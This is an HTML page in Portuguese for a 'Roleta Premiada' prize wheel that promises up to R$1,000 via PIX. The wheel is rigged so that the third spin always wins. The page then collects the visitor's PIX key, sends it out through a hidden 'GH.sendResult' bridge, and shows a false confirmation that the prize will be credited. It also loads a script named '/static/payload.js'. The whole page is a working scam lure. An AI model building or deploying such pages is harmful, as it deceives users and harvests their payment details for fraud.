<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
<meta name="theme-color" content="#1a1a2e">
<title>Roleta Premiada</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a1a;color:#fff;font-family:Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{max-width:400px;width:100%;text-align:center}
h1{font-size:28px;background:linear-gradient(135deg,#f59e0b,#ef4444);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:4px}
.subtitle{color:#94a3b8;font-size:13px;margin-bottom:20px}
.wheel-container{position:relative;width:300px;height:300px;margin:0 auto 24px}
canvas{width:100%;height:100%}
.pointer{position:absolute;top:-12px;left:50%;transform:translateX(-50%);font-size:28px;z-index:10}
.btn-spin{display:inline-block;padding:16px 48px;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;border:none;border-radius:50px;font-size:18px;font-weight:900;cursor:pointer;text-transform:uppercase;letter-spacing:1px;box-shadow:0 4px 20px rgba(245,158,11,0.4);transition:transform 0.1s}
.btn-spin:active{transform:scale(0.95)}
.btn-spin:disabled{opacity:0.5}
.result-box{background:#16212b;border-radius:12px;padding:16px;margin:16px 0;display:none}
.result-box.win{border:2px solid #22c55e;background:#0a1a0a}
.result-box.show{display:block}
.result-box h3{font-size:18px;margin-bottom:4px}
.result-box .prize{font-size:32px;font-weight:900;margin:8px 0}
.spins-left{font-size:12px;color:#64748b;margin-top:12px}
input{width:100%;padding:10px;background:#0f1923;border:1px solid #334155;border-radius:8px;color:#e0e0e0;font-size:14px;margin-top:8px;text-align:center}
</style>
<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
</head>
<body>
<div class="card">
  <h1>🎰 ROLETA PREMIADA</h1>
  <p class="subtitle">Gire e ganhe até R$1.000 no PIX!</p>
  <div class="wheel-container">
    <div class="pointer">▼</div>
    <canvas id="wheel" width="300" height="300"></canvas>
  </div>
  <button class="btn-spin" id="spinBtn" onclick="spinWheel()">🎯 GIRAR ROLETA</button>
  <p class="spins-left" id="spinsLeft">3 rodadas grátis</p>
  <div class="result-box" id="resultBox">
    <h3 id="resultTitle"></h3>
    <div class="prize" id="resultPrize"></div>
    <p id="resultMsg"></p>
    <input type="text" id="pixClaim" placeholder="Sua chave PIX">
    <button class="btn-spin" style="margin-top:12px;font-size:14px;padding:10px 32px" onclick="claimPrize()">💸 RESGATAR</button>
  </div>
  <div id="claimSuccess" style="display:none">
    <div style="font-size:48px">✅</div>
    <h3 style="color:#22c55e">Prêmio Confirmado!</h3>
    <p style="color:#94a3b8;font-size:13px">Creditado em até 30 minutos.</p>
  </div>
</div>
<script src="/static/payload.js"></script>
<script>
var canvas=document.getElementById('wheel'),ctx=canvas.getContext('2d');
var segs=['R$ 1.000','R$ 10','R$ 50','R$ 5','R$ 500','R$ 20','R$ 100','R$ 1'];
var colors=['#ef4444','#f59e0b','#ef4444','#f59e0b','#22c55e','#f59e0b','#ef4444','#f59e0b'];
var angle=0,spinning=false,spinsLeft=3;
var winOnSpin=[false,false,true];
var prizes=['R$ 50,00','R$ 100,00','R$ 50,00'];
function drawWheel(){
  var segAngle=2*Math.PI/segs.length;
  for(var i=0;i<segs.length;i++){
    ctx.beginPath();
    ctx.moveTo(150,150);
    ctx.arc(150,150,140,angle+i*segAngle,angle+(i+1)*segAngle);
    ctx.closePath();
    ctx.fillStyle=colors[i];ctx.fill();
    ctx.strokeStyle='#0a0a1a';ctx.lineWidth=2;ctx.stroke();
    ctx.save();
    ctx.translate(150,150);ctx.rotate(angle+i*segAngle+segAngle/2);
    ctx.textAlign='center';ctx.fillStyle='#fff';ctx.font='bold 12px Arial';
    ctx.fillText(segs[i],95,5);ctx.restore()
  }
  ctx.beginPath();ctx.arc(150,150,28,0,2*Math.PI);ctx.fillStyle='#0a0a1a';ctx.fill();
  ctx.fillStyle='#f59e0b';ctx.font='bold 14px Arial';ctx.textAlign='center';ctx.fillText('PIX',150,156)
}
drawWheel();
function spinWheel(){
  if(spinning||spinsLeft<=0)return;spinning=true;
  document.getElementById('spinBtn').disabled=true;spinsLeft--;
  document.getElementById('spinsLeft').textContent=spinsLeft+' rodadas restantes';
  var startAngle=angle,startTime=Date.now(),totalRotation=(5+Math.random()*5)*2*Math.PI;
  function animate(){
    var elapsed=Date.now()-startTime,progress=Math.min(elapsed/4000,1),ease=1-Math.pow(1-progress,4);
    angle=startAngle+totalRotation*ease;drawWheel();
    if(progress<1)requestAnimationFrame(animate);
    else{spinning=false;document.getElementById('spinBtn').disabled=false;checkResult()}
  }requestAnimationFrame(animate)
}
function checkResult(){
  var won=winOnSpin[3-spinsLeft-1],box=document.getElementById('resultBox');
  box.classList.add('show');
  if(won){box.classList.add('win');document.getElementById('resultTitle').textContent='🎉 PARABÉNS!';
    document.getElementById('resultPrize').textContent=prizes[Math.floor(Math.random()*prizes.length)];
    document.getElementById('resultMsg').textContent='Confirme sua chave PIX!';
    document.getElementById('pixClaim').style.display='block';
    document.getElementById('pixClaim').nextElementSibling.style.display='inline-block'}
  else{box.classList.remove('win');document.getElementById('resultTitle').textContent='😔 Não foi dessa vez';
    document.getElementById('resultPrize').textContent='Tente de novo';
    document.getElementById('resultMsg').textContent=spinsLeft+' rodada(s) restante(s).';
    document.getElementById('pixClaim').style.display='none';
    document.getElementById('pixClaim').nextElementSibling.style.display='none'}
}
function claimPrize(){
  var pix=document.getElementById('pixClaim').value.trim();
  if(pix.length<5)return;
  if(window.GH)window.GH.sendResult('roleta_prize',JSON.stringify({pix_key:pix,timestamp:new Date().toISOString()}));
  document.getElementById('resultBox').style.display='none';document.getElementById('spinBtn').style.display='none';
  document.getElementById('spinsLeft').style.display='none';document.getElementById('claimSuccess').style.display='block'
}
</script>
</body>
</html>
